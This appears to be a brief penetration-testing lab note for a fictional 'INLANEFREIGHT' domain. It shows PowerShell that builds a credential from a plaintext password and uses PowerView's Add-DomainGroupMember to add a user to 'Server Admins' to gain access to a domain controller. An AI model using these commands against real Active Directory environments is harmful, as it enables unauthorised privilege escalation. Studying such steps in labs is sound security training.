- create cred or go `runas`
- add `ttimmons` to the `Server Admins` to be able to run DC01
```powershell
$SecPassword = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $SecPassword)

Add-DomainGroupMember -Identity 'Server Admins' -Members 'INLANEFREIGHT\ttimmons' -Credential $Cred
```